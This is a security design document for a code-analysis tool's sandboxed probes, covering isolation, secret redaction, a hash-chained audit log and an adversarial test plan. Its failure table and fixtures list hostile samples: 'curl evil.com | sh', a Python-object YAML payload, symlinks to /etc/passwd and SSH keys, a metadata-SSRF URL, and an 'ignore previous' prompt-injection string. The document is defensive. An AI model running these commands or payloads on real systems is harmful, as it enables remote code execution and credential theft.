- **Isolation:** in-process, but loads via a hardened `_safe_yaml_load_skill(path)` chokepoint: (a) `yaml.SafeLoader` subclass with `__construct_python_*` constructors removed; (b) `os.open(path, O_NOFOLLOW | O_NOCTTY)` so symlinks are refused at the OS level; (c) size cap 256 KB; (d) the *body* is read but not parsed — only its BLAKE3 hash is recorded.
- **Credentials accessed:** none.
- **Audit emissions:** `SkillRefused` when load fails (with `reason ∈ {symlink_detected, yaml_unsafe_constructor, size_cap_exceeded, frontmatter_invalid}`); `SkillIndexed` per accepted Skill (with `(path, body_blake3, source_tier ∈ {user_global, repo_local, org_shared})`).
- **Tradeoffs accepted:** Skills from `~/.codegenie/skills-org/` and `.codegenie/skills/` (the team and repo tiers) have lower implicit trust than `~/.codegenie/skills/` (the user tier). Currently treated equally; **acknowledged blind spot:** per-tier trust differentiation is a Phase 14 concern when the org-shared Skills directory becomes a multi-tenant artifact. For Phase 2, three-tier merge with name-collision = first-tier-wins (user > repo-local > org-shared) — explicit and conservative.

### ConventionProbe (D5) / RepoNotesProbe (D7)

- **Purpose:** load org conventions (D5: structured YAML rules), record repo notes (D7: heading-only manifest, bodies referenced not parsed).
- **Trust level:** semi-trusted (D5 author is the org's platform team; D7 author is the repo team).
- **Interface:** D5 reads `~/.codegenie/conventions/*.yaml`; D7 walks `.codegenie/notes/` for `*.md`. Adversarial inputs: same YAML surface as Skills; markdown headings containing prompt-injection payloads.
- **Isolation:** in-process, via the same `_safe_yaml_load` chokepoint as Skills. RepoNotes bodies are *never* parsed — only the heading extractor runs, and it has a depth cap.
- **Credentials accessed:** none.
- **Audit emissions:** `ConventionLoaded` (with `(name, source_path, body_blake3)`); `RepoNoteIndexed` (with `(path, heading_count, body_blake3)`).
- **Tradeoffs accepted:** heading strings can carry prompt-injection markers; preserved verbatim with a `prompt_injection_marker_count` metadata field (same mechanism as Phase 1's untrusted-source handling). The Planner later receives them via the channeled tool-output path, never inlined.

### Layer B/G external-CLI sandbox runner

- **Purpose:** invoke `scip-typescript`, `syft`, `grype`, `trivy`, `semgrep`, `ast-grep`, `ripgrep`, `gitleaks` under a uniform jail.
- **Trust level:** untrusted (the *binary* is supply-chain-checksum-pinned at install time, but every byte it produces is treated as untrusted output).
- **Interface:** `_run_external_cli(probe_name, argv, cwd, allowlisted_egress, capability_token) -> CompletedProcess`. The capability token encodes whether this probe is allowed to use `--share-net=registry-only` (only `syft` in explicit online mode and `grype` for vuln-DB refresh).
- **Isolation:** `bubblewrap` (Linux) / a documented stub (macOS dev only — macOS has no equivalent; documented gap). Flags:
  - `--ro-bind /usr /usr --ro-bind /lib /lib --ro-bind /lib64 /lib64 --ro-bind /bin /bin` (system libs)
  - `--ro-bind <analyzed-repo> /work` (the target repo, read-only)
  - `--ro-bind <vuln-db-cache> /vuln-db` (read-only for `grype`/`trivy`)
  - `--bind <per-probe-tempdir> /tmp/probe` (writable)
  - `--unshare-all --share-net=no` (default; `--share-net=registry-only` only when capability token grants it)
  - `--die-with-parent --new-session --cap-drop ALL`
  - `--seccomp <path-to-codegenie-seccomp-profile.bpf>` (denylists `ptrace`, `kexec_load`, `mount`, `pivot_root`, etc.)
- **Credentials accessed:** none in the jail — env strip leaves only `PATH=/usr/bin:/bin`, `HOME=/tmp/probe`, `LANG`, `LC_ALL`.
- **Audit emissions:** `Started` + terminal event with `egress_attempts: int` populated by parsing `dmesg`/`audit.log` if seccomp blocked any; `EgressBlocked` when any block was observed.
- **Tradeoffs accepted:** macOS lacks bubblewrap — on macOS dev hosts, the runner falls back to a process-isolation-only mode (rlimits + env strip + cwd restriction, no kernel namespace), with a startup warning. CI is Linux. This documents the gap and matches Phase 1's posture of "Linux is the security-canonical platform; macOS is a developer convenience tier."

### Layer C runtime sandbox runner

- **Purpose:** build the existing image (for C2 SBOM and C3 CVE), run the container under strace (C4), inspect the filesystem (C6 cert paths).
- **Trust level:** untrusted (runs `RUN` instructions and `npm install` lifecycle scripts authored by the adversary).
- **Interface:** `_run_in_container(image_or_dockerfile, scenario, capability_token) -> RuntimeTraceArtifact`. Scenario is a typed enum: `Startup | SmokeTest | Healthcheck | Shutdown | ErrorPath`.
- **Isolation:** container with `--cap-drop=ALL --security-opt=no-new-privileges --network=none` (default) plus rootless preferred. strace attaches from outside the container via the container PID-1's host PID. **Acknowledged gap:** this is weaker than [ADR-0012](../../production/adrs/0012-microvm-sandbox-for-trust-gates.md)'s microVM. Phase 2 documents the gap; when ADR-0019 resolves and the microVM stack ships, the `_run_in_container` chokepoint swaps to `_run_in_microvm` with no probe-side API change. Per ADR-0012 the microVM is *for transforms*, not for gather; Phase 2 is the strongest "good enough" today.
- **Credentials accessed:** the existing-image build may need registry credentials. If `~/.docker/config.json` exists, it is *not* bind-mounted into the build context by default; the user must opt in via `--enable-private-registry` which surfaces a capability token. Without the token, only public-registry pulls work.
- **Audit emissions:** `ContainerLaunched`, `ContainerTracedScenario` (per scenario), `ContainerExited`, `EgressBlocked` (any attempted network connection from inside the container).
- **Tradeoffs accepted:** rejecting `~/.docker/config.json` by default breaks private-base-image gathering; the opt-in token re-enables it with an explicit user choice and an audit event. This is the right default per "least privilege" — most repos use public bases for their *current* image (the whole point of the migration is to swap them for Chainguard distroless), so default-deny is workable.

### Secret redactor (Writer chokepoint extension)

- **Purpose:** intercept every string in every `ProbeOutput.schema_slice` before it lands in `repo-context.yaml`, the cache, the raw artifact, or the audit log; replace anything that matches a secret pattern with `<REDACTED:fingerprint=BLAKE3_8>`.
- **Trust level:** trusted (chokepoint; same posture as Phase 0/1 sanitizer).
- **Interface:** `redact(slice: dict[str, Any], probe_name: str) -> tuple[dict, list[SecretFinding]]`. Patterns: AWS `AKIA[0-9A-Z]{16}`, GitHub `ghp_[A-Za-z0-9]{36}`, generic JWT `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`, RSA `-----BEGIN ... PRIVATE KEY-----`, NPM `npm_[A-Za-z0-9]{36}`, Anthropic `sk-ant-[A-Za-z0-9_-]+`, Shannon-entropy threshold for unknown strings of length ≥ 32 with charset entropy ≥ 4.5 bits/char.
- **Isolation:** in-process; runs after Pydantic validation, before yaml.dump.
- **Credentials accessed:** the plaintext secret strings, transiently. Writes to `.codegenie/findings/secrets/<fingerprint>.enc` encrypted with a per-repo key under `~/.codegenie/keys/<repo>.key` (mode 0600). The encryption key is generated on first run per repo; lost key = lost ability to read past findings (acceptable).
- **Audit emissions:** `SecretRedacted` (with `(probe_name, fingerprint, pattern_class)`) per redaction; no plaintext in the event.
- **Tradeoffs accepted:** false positives (a UUID that happens to look like a JWT prefix) will be redacted. Acceptable — fingerprint-based unique identifier still lets the Planner refer to it, and the false-positive rate is reviewable by enumerating the redaction events.

### EventStream emitter (audit log writer)

- **Purpose:** emit typed `ProbeExecutionEvent` per [ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md) / [ADR-0034](../../production/adrs/0034-event-sourcing-canonical-primitive.md) to `.codegenie/audit/events.jsonl`, hash-chained.
- **Trust level:** trusted.
- **Interface:** `emit(event: ProbeExecutionEvent) -> EventId` where:
  ```python
  class ProbeStarted(BaseModel):
      kind: Literal["started"] = "started"
      event_id: EventId; probe_id: ProbeId; workflow_id: WorkflowId | None
      probe_version: str; declared_inputs_hash: str; capability_grant: CapabilityFingerprint
      timestamp: datetime

  class ProbeFinishedOk(BaseModel):
      kind: Literal["finished_ok"] = "finished_ok"
      event_id: EventId; probe_id: ProbeId; output_blob_blake3: str
      duration_ms: int; cache_hit: bool; egress_attempts: int
      timestamp: datetime

  class ProbeFinishedFailed(BaseModel):
      kind: Literal["finished_failed"] = "finished_failed"
      event_id: EventId; probe_id: ProbeId; failure: ProbeFailure  # itself a sum type
      timestamp: datetime

  class ProbeTimedOut(BaseModel): ...
  class ProbeCacheHit(BaseModel): ...
  class IndexFreshnessVerified(BaseModel): ...
  class IndexFreshnessForgeryDetected(BaseModel): ...
  class SkillRefused(BaseModel): ...
  class GrammarLoadRefused(BaseModel): ...
  class EgressBlocked(BaseModel): ...
  class SecretRedacted(BaseModel): ...

  ProbeExecutionEvent = Annotated[Union[...], Field(discriminator="kind")]
  ```
  Every event carries `prev_hash: BLAKE3Hex` of the previous line; the writer fails closed if the chain breaks.
- **Isolation:** in-process; appends via `O_APPEND` with `fcntl` LOCK_EX to serialize concurrent gathers.
- **Credentials accessed:** none.
- **Audit emissions:** itself; bootstrapping is a `ChainGenesis` event at first write.
- **Tradeoffs accepted:** more lines in the audit log than Phase 0/1 (per-probe ≥ 2 events). Buys: replayability per [ADR-0034](../../production/adrs/0034-event-sourcing-canonical-primitive.md) — when Phase 9 routes events to Postgres, the JSONL is replayable directly into the table. The hash chain is detectable on tamper without requiring external storage. **String-typed `event_kind` is explicitly forbidden** per the Phase brief — the discriminator must be a `Literal` and the union must use `assert_never` at every consumer per [ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md).

---

## Data flow

End-to-end run, with trust boundary crossings marked:

```
1. CLI invocation                                              [HOST → TRUSTED]
   - Phase 0 tool-readiness check now covers Layer B/C/G binaries
   - Loads ~/.codegenie/grammars.lock and verifies pinned-hash for any
     tree-sitter grammar that will be loaded (B3, G4)
   - Generates per-repo encryption key on first run (D-tier write 0600)

2. Coordinator schedules probes                                [TRUSTED]
   - Topologically orders by `requires`
   - Constructs per-probe Capability bundle:
       - In-proc probes: InProcessCapabilities(cwd_root=<repo>, ...)
       - Layer B/G CLI probes: SubprocessSandboxCapabilities(
             allowlist_egress=[], rlimits=..., bwrap_profile=...)
       - Layer C probes: ContainerSandboxCapabilities(
             allow_private_registry=False, allow_egress=[], ...)
       - Layer D probes (skills/conventions/notes): InProcessCapabilities
   - Emits ProbeStarted per probe to audit/events.jsonl

3a. In-proc probes (B2/B4/C1/C5/C7/D2/D3/D4/D5/D7/G3)         [TRUSTED]
    - Load adversarial YAML/JSON via Phase 1 parser sandbox boundary
    - Skills/Conventions/Notes go through _safe_yaml_load_skill chokepoint
    - B2 IndexHealth verifies cryptographic anchoring (see below)

3b. Tree-sitter probes (B3/G4)        [TRUSTED → _grammar_runner SUBPROCESS]
    ╔══ TRUST BOUNDARY 2 ══╗
    - Spawns _grammar_runner subprocess (Python; rlimits applied)
    - Loads the BLAKE3-verified grammar .so/.dylib inside the subprocess
    - Parses adversarial source; returns AST JSON over pipe
    - Coordinator validates AST shape with Pydantic, sanitizes

3c. Layer B/G external-CLI probes (B1/B5/G1/G2/G5/gitleaks)
    ╔══ TRUST BOUNDARY 3 ══╗                  [TRUSTED → BWRAP JAIL]
    - bubblewrap profile applied: --unshare-all --share-net=no --cap-drop ALL
      --ro-bind <repo> /work --bind <tmpdir> /tmp/probe --seccomp <profile>
    - Env stripped (no AWS/GITHUB/NPM/ANTHROPIC creds reachable)
    - Output read over pipe; capped at 64MB; parsed with Pydantic
    - Egress attempts counted from seccomp audit; nonzero → EgressBlocked event

3d. Layer C runtime trace (C2/C3/C4/C6)
    ╔══ TRUST BOUNDARY 4 ══╗               [TRUSTED → CONTAINER SANDBOX]
    - docker/podman build with adversarial Dockerfile + --network=none
      unless --enable-private-registry capability was granted
    - Container run with --cap-drop=ALL --security-opt=no-new-privileges
      --network=none; rootless preferred
    - strace -f attaches from host PID; trace artifact captured to
      per-probe tempdir, bind-mounted into bwrap'd syft/grype invocations
    - Container exits or is killed on scenario timeout; artifact handed to
      C2/C3/C4/C6 in-process correlators (TRUSTED side again)

4. Writer chokepoint                                            [TRUSTED]
   - Phase 0/1 sanitizer (size/depth/path scrub) runs first
   - NEW: SecretRedactor replaces secret-pattern matches with
     <REDACTED:fingerprint=...>; plaintext encrypted under ~/.codegenie/keys/
     and written to .codegenie/findings/secrets/<fp>.enc (0600)
   - NEW: PromptInjectionMarker annotates strings with prompt-injection
     signatures (no replacement; tagging for Phase 3 channeling)
   - Output written to repo-context.yaml, raw/*.json, cache/<key>.json
   - ProbeFinishedOk emitted (with output_blob_blake3) to events.jsonl

5. B2 IndexHealth runs LAST                                     [TRUSTED]
   - Reads events.jsonl for FinishedOk per upstream probe
   - For each (scip, runtime_trace, sbom, semgrep):
       - Read recorded output_blob_blake3 from the FinishedOk event
       - Recompute BLAKE3 of the cached blob on disk
       - Verify the upstream probe ran against current RepoSnapshot.git_commit
       - Verify no source file's BLAKE3 has drifted from the commit's
         git-tracked blob hash for that path
   - All three pass → confidence: high. Any fail → confidence: medium/low
     with structured degradation_reason ∈ {commit_mismatch, blob_tamper,
     source_drift, upstream_failed, upstream_missing}
   - Emits IndexFreshnessVerified per upstream (or IndexFreshnessForgeryDetected
     on hash mismatch)
   - mtime is NEVER consulted

6. Audit chain verification at end                              [TRUSTED]
   - Walk events.jsonl line by line; verify each line's prev_hash matches
   - Mismatch → gather fails LOUD with "audit chain broken at line N"
```

---

## Failure modes & recovery

| Failure | Detected by | Containment | Recovery |
|---|---|---|---|
| Malicious YAML in Skill triggers `!!python/object` | `yaml.SafeLoader` raises | Skill skipped; `SkillRefused(reason=yaml_unsafe_constructor)` emitted | Other Skills load; user sees the refusal in the gather report; the malicious file is named so they can investigate |
| Symlink under `.codegenie/skills/` points to `/etc/passwd` | `O_NOFOLLOW` open returns ELOOP | Skill skipped; `SkillRefused(reason=symlink_detected)` emitted | Same as above; user is alerted that an attacker may have planted symlinks |
| Tree-sitter grammar BLAKE3 mismatch against `grammars.lock` | Pre-load hash check | Probe fails; `GrammarLoadRefused(grammar, expected, actual)` emitted; no grammar code executed | User notified to either pin the new grammar (deliberate upgrade) or investigate the mismatch |
| `syft` attempts to phone home in offline mode | seccomp denies; bubblewrap `--share-net=no` blocks at namespace level | Connection refused; probe completes with SBOM from local resolution only; `EgressBlocked(probe=sbom, destination=registry.npmjs.com)` emitted | Probe output may be less complete; user sees the block in the audit log and can opt into online mode with `--enable-network-for-sbom` (capability token) |
| `gitleaks` finds a real AWS key in `.git/` history | gitleaks completes normally; SecretRedactor matches `AKIA...` | Plaintext replaced with `<REDACTED:fingerprint=...>` in all visible outputs; plaintext encrypted under `~/.codegenie/keys/<repo>.key` | Planner retrieves plaintext only via `SecretFindingCapability` token; LLM never sees the plaintext inline; human reviewer sees the fingerprint in the PR evidence bundle and can decrypt locally |
| Adversarial Dockerfile runs `curl evil.com | sh` at `docker build` time | Container has `--network=none` by default; `--enable-private-registry` (if granted) goes through allowlist proxy | Connection refused; build may fail (revealing the malicious instruction) or succeed without the curl effect | User reads the Dockerfile in the audit; `EgressBlocked(probe=sbom, destination=evil.com)` documents the attempt |
| Cache blob on disk has been swapped (cache poisoning) | B2 IndexHealth recomputes BLAKE3, finds mismatch with audit-log-recorded hash | `IndexFreshnessForgeryDetected` emitted; that index slice downgraded to `confidence: low` with `degradation_reason=blob_tamper` | Planner refuses to advance on `low` confidence per ADR-0008; user re-runs gather with `--force-refresh` to rebuild the blob |
| Audit log line tampered with | Final chain-walk finds mismatched `prev_hash` | Gather fails LOUD ("audit chain broken at line N"); refuses to write final `repo-context.yaml` | User investigates which process touched `events.jsonl`; the chain mismatch line tells them where the tamper started; recovery is a full re-gather (the tampered events are not trusted) |
| Adversarial `pnpm-lock.yaml` with 10M `packages` entries → `networkx` depgraph OOM | Phase 1 parser sandbox rlimits trip RLIMIT_AS=512MB; subprocess SIGKILLed | `ProbeFinishedFailed(failure=oom)` emitted; probe slice marked as `confidence: low` | Coordinator continues; user sees the failure in the report; raises a fixture issue if it's a legitimate-but-large repo |
| Compromised `gitleaks` binary | Pin-on-install hash check at tool-readiness mismatch | CLI refuses to start; gather fails fast with "gitleaks hash drift" | User reinstalls from a trusted source; updates the pin if the change is intentional |
| ExternalDocsProbe URL list contains `http://169.254.169.254/...` (cloud metadata SSRF) | Subprocess bubblewrap allowlist denies non-allowlisted hosts | Connection refused; `EgressBlocked(probe=external_docs, destination=169.254.169.254)` emitted | User reviews the URL list config; SSRF probe failed harmlessly |
| `IndexHealthProbe` itself crashes | Coordinator catches per-probe exception (Phase 0 failure isolation) | All upstream index slices default to `confidence: unknown` (Pydantic-modeled sum-type variant); Planner refuses to advance on `unknown` | User investigates; B2 has its own dedicated tests and dashboards per `localv2.md §5.2` |
| macOS host (no bubblewrap) | Tool-readiness check at startup | Warning printed: "macOS: process-isolation only (no kernel namespace); CI is Linux-canonical" | Continue with weaker isolation; the user accepts the dev-host tier explicitly |

---

## Resource & cost profile

Security is not free. The deliberate spends, in order of biggest-cost-first:

- **bubblewrap setup per CLI invocation:** ~30–80 ms cold per probe (fork + namespace setup + seccomp profile load). Across ~10 Layer B/G CLI invocations per cold gather, this adds ~300–800 ms to the wall-clock — well within the `localv2.md §5.3` "warm gather 20–40s" budget.
- **Container sandbox cold start (Layer C):** ~1–3 s per scenario for the rootless container + strace attach. Layer C is already the slowest layer per `localv2.md §5.3` ("the heaviest layer; sequential by necessity"); the sandbox adds ~10–15% overhead. The Phase 5 microVM transition (when ADR-0019 lands) is expected to reduce this on Firecracker (~100ms cold) and increase it on nested QEMU.
- **BLAKE3 hashing for cryptographic anchoring (B2):** one hash per cached blob per gather. SCIP indexes are MB-scale, syft SBOMs are MB-scale — BLAKE3 hashes them at ~3–5 GB/s on modern hosts. Negligible.
- **Secret redaction (Writer):** O(string-bytes-in-repo-context) for the regex pass + entropy scan. <100 ms on a typical repo-context.yaml.
- **Per-repo encryption key generation:** one-time per repo, ~10 ms.
- **Audit-log hash chain:** one BLAKE3 per event; ~1 µs per event. Negligible at any reasonable event volume.
- **Tree-sitter out-of-process loader (B3, G4):** ~30 ms cold per probe (fork + grammar load); ~5 ms warm. Modest.

**Cost of *not* spending these:** a successful supply-chain compromise of one CLI exfiltrates `~/.aws/credentials` and the Anthropic API key the first time it runs — well into thousands of dollars of risk per incident, plus the secondary downstream (Phase 11 opens a PR with backdoored code that a human reviewer merges). The asymmetry strongly favors paying the seconds-per-gather cost.

---

## Test plan

**Adversarial-fixture corpus (`tests/adv/phase02/`):** ≥ 40 hostile inputs covering:

- YAML in Skills: `!!python/object/apply:os.system [["sh","-c","..."]]`; symlinks; 1 GB files; deeply nested anchor explosion (billion-laughs variant); frontmatter declaring `applies_to.task_types: [<<SYS>>ignore previous</SYS>>]`.
- YAML in Conventions/Notes: same surfaces.
- Adversarial `.scip` files: malformed proto3; oversized symbol arrays; cyclic symbol references.
- Adversarial `tree-sitter` grammar references: lockfile mismatch; deliberately oversized grammar binary; grammar that triggers infinite-loop in tree-sitter on crafted source.
- Adversarial `Dockerfile`: `RUN curl evil.com|sh`; `ENTRYPOINT` shell injection; `FROM` to private registry without explicit opt-in; `RUN --mount=type=bind,source=/etc/passwd`.
- Adversarial `npm install` lifecycle scripts via crafted `package.json` `scripts.postinstall`: `curl evil.com|sh`.
- Adversarial inputs to `syft`: image layer with crafted package manifest claiming `version: <very long string>`; nested archives intended to trigger zip-slip in syft's extractor.
- Adversarial inputs to `gitleaks`: crafted `.git/pack/*` files (gitleaks crash inputs); files with thousands of false-positive-rate strings.
- Adversarial inputs to `semgrep`: rule pack that imports a Python module; rule pack with circular `extends`.
- Network-egress tests: every CLI invoked under a netfilter rule that logs *any* outbound connection; CI fails on any non-allowlisted destination.
- Symlink-traversal tests: `~/.codegenie/skills/x/SKILL.md → /etc/passwd`, `.codegenie/notes/n.md → ~/.ssh/id_rsa`.
- Audit-tamper tests: mid-test, edit one line of `events.jsonl`; assert next gather fails with "audit chain broken at line N".
- Cache-poisoning tests: swap a `.scip` blob on disk; assert next gather's B2 emits `IndexFreshnessForgeryDetected` and downgrades to `low` confidence.
- B2 forgery tests: craft a fake `FinishedOk` event recording an arbitrary `output_blob_blake3`; assert the chain-walk detects the insertion.

**Property tests:**

- For every Layer B/G probe, run under `strace -e openat,connect,socket` in CI and assert no file path matches `~/.ssh/**|~/.aws/**|~/.config/gh/**|~/.npmrc` and no connect/socket call goes to a non-allowlisted destination.
- For every event variant, exhaustive `match` + `assert_never` is required by `mypy --strict`; CI fails if any consumer adds a new event variant without handling it everywhere.

**Regression tests:**

- A real CVE fixture repo where `gitleaks` finds a real-looking AWS key embedded in a test fixture; assert the plaintext appears in `.codegenie/findings/secrets/<fp>.enc` but NOT in `repo-context.yaml`, `cache/*.json`, `audit/events.jsonl`, or any log line.

**Mutation tests on the SecretRedactor:** every regex weakened (e.g., `AKIA[0-9A-Z]{16}` → `AKIA[0-9]{16}`) should cause at least one test to fail; if not, the test corpus is insufficient.

**Per-platform CI matrix:** Linux (canonical, full bubblewrap), macOS (degraded process-isolation-only path; documented gap; only a subset of adversarial fixtures applicable).

---

## Design patterns applied

| Decision | Pattern applied | Why here | Pattern NOT applied (and why) |
|---|---|---|---|
| Per-probe `ProbeContext.capabilities` discriminated union | **Capability pattern** + **tagged union / sum type** ([ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md)) | A probe physically cannot perform an action without holding the capability token; "is_privileged" booleans checked everywhere are forgeable, capabilities are not. The discriminated union (`InProcessCapabilities | SubprocessSandboxCapabilities | ContainerSandboxCapabilities`) means each probe family's allowed surface is type-checked, and mypy `assert_never` catches a new family without explicit handling. | **Decorator-based "trusted/untrusted" annotation** rejected — it's a string that humans can mis-spell; capability token is enforceable at the type system layer. |
| Bubblewrap subprocess + Container sandbox + future microVM swap behind one `_run_external_cli` / `_run_in_container` chokepoint | **Hexagonal architecture / Ports & Adapters** | The probe code calls a port (`_run_in_container(image, scenario, capability)`); the adapter is bubblewrap today, microVM (Firecracker / gVisor per [ADR-0019](../../production/adrs/0019-sandbox-stack.md)) tomorrow. Migrating to ADR-0012's microVM when it ships is one adapter swap, no probe edits. | **Hardcoded `subprocess.run(['bwrap', ...])` in each probe** rejected — would duplicate the isolation logic across 10+ probes and make the ADR-0012 migration a 10+-file edit; also makes auditing "what's the isolation profile right now" require reading every probe. |
| `ProbeExecutionEvent` as a Pydantic discriminated union | **Event sourcing** ([ADR-0034](../../production/adrs/0034-event-sourcing-canonical-primitive.md)) + **Make illegal states unrepresentable** ([ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md)) | The event log is the audit primitive; per ADR-0034, Phase 9 routes the same event shape to Postgres. By using a discriminated union (not `dict[str, Any]` with a `kind` field), every consumer pattern-matches exhaustively and `mypy --strict` catches a new variant added without handling. `ProbeStarted` with no `probe_id` is type-unrepresentable. | **`event_kind: str` payload field** explicitly forbidden by Phase brief; would force every consumer to defensive-parse and re-validate, and the brief calls out that this is exactly the anti-pattern to avoid. |
| `_safe_yaml_load_skill` chokepoint for all Skill/Convention/Notes YAML | **Smart constructor** + **Chain of responsibility / Pipeline** | YAML loading from disk is parseable external data per ADR-0033 §2; the smart constructor returns `Result[Skill, ParseError]` and refuses to construct an invalid instance. The pipeline is `open(O_NOFOLLOW) → size_cap → safe_load → frontmatter_validate → body_blake3 → Skill` — each stage can fail and the failure is a typed event. | **`yaml.load(open(p))` inline at each Skill consumer** rejected — has been a Python RCE vector for over a decade and is exactly the surface this phase exists to harden; Phase 0 already bans it via `forbidden-patterns` pre-commit. |
| `IndexHealthProbe` (B2) anchors freshness cryptographically | **Make illegal states unrepresentable** (typed `IndexConfidence` sum type) + **Smart constructor** | `confidence: "high"` as a free-form string is forgeable; modeled as `Annotated[Union[ConfidenceHigh, ConfidenceMedium(degradation_reason: DegradationReason), ConfidenceLow(degradation_reason: DegradationReason), ConfidenceUnknown], Field(discriminator="kind")]`. The `medium`/`low` variants *require* a `degradation_reason` enum — you cannot construct a downgrade without saying why. Anchors the ADR-0008 "objective signals only" promise by making the signal honest at the type layer. | **`confidence: str` + free-form reason string** rejected — reason strings drift over time, can't be aggregated, and the type doesn't force the implementer to surface *why* the index is degraded. |
| Layer B/G external-CLI invocation goes through one `_run_external_cli(... capability)` function | **Command pattern** | The CLI invocation is a value-typed Command (`ExternalCliCommand(name, argv, allowlisted_egress, capability_grant)`); the runner accepts any Command, applies the same jail consistently, emits the same audit events. Auditing "every external CLI invocation" is `grep _run_external_cli`. | **Bespoke `subprocess.run(...)` per probe** rejected — each probe would re-invent the env strip, the rlimits, the audit emission, and the egress allowlist; inconsistencies become security holes. |
| `SecretFindingCapability` token gates Planner access to plaintext secret findings | **Capability pattern** | The Planner LLM never sees a plaintext secret; only a fingerprint. A separate retrieval path requires a `SecretFindingCapability(fingerprint=...)` token, which is only constructible in trusted contexts (human approval flow). The LLM cannot mint the token. | **"LLM gets full output, please don't echo it"** is the standard mistake — LLMs sometimes echo. The capability pattern makes the property structural, not behavioral. |

---

## Risks (top 3–5)

1. **Container sandbox (Boundary 4) is weaker than the ADR-0012 microVM and Phase 2 cannot wait for it.** A container-escape CVE in runc/containerd lands during Phase 2 → adversarial Dockerfile can reach the gather host. *Mitigation:* `_run_in_container` is a stable port; Layer C migrates to `_run_in_microvm` with zero probe-side changes once ADR-0019 picks the stack. Track CVEs in runc/containerd; pre-emptively patch. *Acceptance:* documented gap; the alternative (block Phase 2 on Phase 5) blocks the entire roadmap.
2. **macOS dev-host falls back to process-isolation-only (no bubblewrap).** A developer running `codegenie gather` on macOS has *materially weaker* isolation than CI. *Mitigation:* security-canonical platform is Linux; macOS prints a warning at startup; CI gates all adversarial fixtures on Linux; no production gather ever runs on macOS. *Acceptance:* documented in tooling section.
3. **Secret redaction false-negatives are a silent leak.** A custom credential format the redactor regex set doesn't know about lands in `repo-context.yaml`. *Mitigation:* the entropy-threshold catch-all (Shannon ≥ 4.5 bits/char, length ≥ 32) is the safety net; org-specific patterns can be added to a per-deploy catalog at `~/.codegenie/secret-patterns/*.yaml`; mutation tests on the redactor make regression visible. *Acceptance:* false-positive rate is the deliberate tradeoff for keeping false-negative rate low.
4. **Tree-sitter grammar pinning is supply-chain-only — pinned grammars themselves could have day-1 CVEs.** A grammar with a memory-corruption bug ships with a valid pin; the out-of-process `_grammar_runner` contains the blast radius but doesn't prevent the bug. *Mitigation:* the grammar runs in an rlimited subprocess with no network and no secrets; the worst outcome is a crashed subprocess, which the Coordinator handles as `ProbeFinishedFailed`. Grammar updates land via deliberate pin updates (PR-reviewable). *Acceptance:* irreducible without grammar-author-side fuzzing investment.
5. **Per-repo encryption key (`~/.codegenie/keys/<repo>.key`) is plaintext on disk at mode 0600.** A host-level compromise reads the key and decrypts past findings. *Mitigation:* the keys live in `$HOME`, same trust tier as `~/.ssh/id_rsa`; a host compromise can read those too. Going further (system keychain integration, age-encryption with a passphrase) is Phase 16 territory. *Acceptance:* matches the host's existing key-management tier; not a regression.

---

## Acknowledged blind spots

- **No per-tier trust differentiation in Skills loader.** `~/.codegenie/skills/` (user), `.codegenie/skills/` (repo team), `~/.codegenie/skills-org/` (org-shared) all currently load with the same gate. A compromise of any tier compromises the whole. Per-tier signing (Sigstore-style) is Phase 14 territory.
- **`ExternalDocsProbe` (D8) is the first Phase 2 probe with outbound network**, and its host allowlist is config-driven. SSRF-via-misconfigured-allowlist is a real risk; the bubblewrap jail prevents AWS-metadata SSRF (`169.254.169.254` is not in any reasonable allowlist), but doesn't prevent a misconfigured allowlist from being too generous. This is a config-review concern, not a design-time fix.
- **Audit log is hash-chained but not signed.** An attacker who can write to the whole `.codegenie/audit/` directory can rewrite the chain from the genesis event upward and produce a forged-but-internally-consistent chain. Real protection requires either an external append-only sink (Phase 14's MCP server operationalization) or signing with a key not on the gather host. Both are future-phase concerns.
- **`docker build` step at Layer C runs `npm install` lifecycle scripts.** Even with `--network=none`, those scripts can mutate the image filesystem in adversarial ways the SBOM probe might not notice. Confidence on `runtime_trace` for an adversarial repo is necessarily lower than for a benign one; B2's `IndexHealthProbe` does not model this gradient yet. Adding an "adversarial-confidence" tier is a Phase 14+ refinement.
- **macOS has no bubblewrap equivalent**, so the Layer B/G CLI sandbox is weaker on dev hosts. Documented; CI is Linux-canonical. A future option (`crabwalk`, `landlock`-via-systemd-run on Linux) might unify the abstraction but isn't a Phase 2 commitment.
- **Phase 2 audit-log shape is a draft of the Phase 9 event log.** When ADR-0034 lands operationally in Phase 9, the JSONL shape must migrate cleanly to Postgres; schema drift between Phase 2's draft and Phase 9's production model is a risk. Mitigated by writing the discriminated-union now (per [ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md)) rather than free-form JSON.

---

## Open questions for the synthesizer

1. **Bubblewrap is Linux-specific.** Is the macOS dev-host "process-isolation only" fallback acceptable, or do we want to invest in a unified abstraction (e.g., `subprocess` + `seccomp` via `nsjail` on Linux, an `eslogger`/`endpoint-security`-based wrapper on macOS) at Phase 2 cost? My recommendation: accept the gap; CI is Linux-canonical and the macOS dev-host warning is sufficient. Best-practices lens may push back wanting platform parity.
2. **`gitleaks` is in `CLAUDE.md`'s Phase 2 scope language but not in `localv2.md §5.6`'s G-probe list.** Is Phase 2 actually shipping `gitleaks`, or is it future? My read: yes for Phase 2 per the brief; designed accordingly. Worth confirming with the brief author.
3. **Cryptographic anchoring on B2 IndexHealthProbe vs. mtime + commit comparison.** Anchoring is more secure but adds gather-time hashing cost for every cached blob. Performance lens may push for a hybrid (mtime as a cheap pre-check, BLAKE3 only on suspicion). My recommendation: full anchoring — mtime is forgeable, and the cost is ~10s of ms even on multi-GB caches; the security benefit on ADR-0008's promise is structural.
4. **Per-repo encryption key for findings storage.** Should the key live in `~/.codegenie/keys/<repo>.key` (file, mode 0600) or in the OS keychain (Keychain on macOS, `secret-tool` / libsecret on Linux)? Keychain is more secure but introduces platform-conditional behavior and a runtime dependency. My recommendation: file-on-disk for Phase 2 (matches `~/.ssh/id_rsa`-tier); keychain integration is a Phase 16 hardening item.
